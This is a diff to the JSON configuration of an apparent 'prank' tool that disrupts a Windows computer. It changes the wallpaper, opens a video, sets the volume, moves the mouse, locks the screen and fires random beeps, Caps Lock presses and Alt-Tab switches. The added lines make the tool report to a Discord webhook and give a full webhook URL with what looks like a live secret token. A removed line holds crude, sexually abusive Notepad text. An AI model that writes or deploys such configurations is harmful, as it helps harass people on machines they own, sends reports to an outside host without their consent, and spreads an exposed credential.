@@ -1,13 +1,15 @@
 {
   "action": "prank", 
+  "report_method": "discord",
+  "discord_webhook_url": "https://discord.com/api/webhooks/1381285536219795667/uKaG-Ej-qsF1O0v8z81MNhq4ujBf3vU_RkHwgsTEQp2siPEqNzVVIM0gHt7Bxjs8MAnV",
   "wallpaper": "https://images.hdqwalls.com/download/cute-pikachu-6o-1920x1080.jpg",
   "open_website": "https://youtu.be/uNtki7kpa04?si=7VdoCucDrDyGYcIU",
 
   "set_volume": true,
   "volume": 10,
 
-  "notepad": true,
-  "notepad_text": "SYBAU and finger yourself",
+  "notepad": false,
+  "notepad_text": "Skibidi toilet dob lob stobster",
 
   "random_mouse": false,
 
@@ -15,23 +17,23 @@
   "mouse_moves": 2,
   "mouse_interval": 10,
 
-  "lock_screen": true,
+  "lock_screen": false,
 
   "random_start_menu": false,
-  "start_menu_times": 3,
-  "start_menu_interval": 60,
+  "start_menu_times": 2,
+  "start_menu_interval": 6,
 
   "random_capslock": false,
   "capslock_times": 2,
   "capslock_interval": 10,
 
-  "random_beep": true,
-  "beep_times": 3,
-  "beep_interval": 5,
+  "random_beep": false,
+  "beep_times": 2,
+  "beep_interval": 12,
 
-  "random_alt_tab": true,
+  "random_alt_tab": false,
   "alt_tab_times": 2,
-  "alt_tab_interval": 4,
+  "alt_tab_interval": 10,
 
   "run_once": true,
 
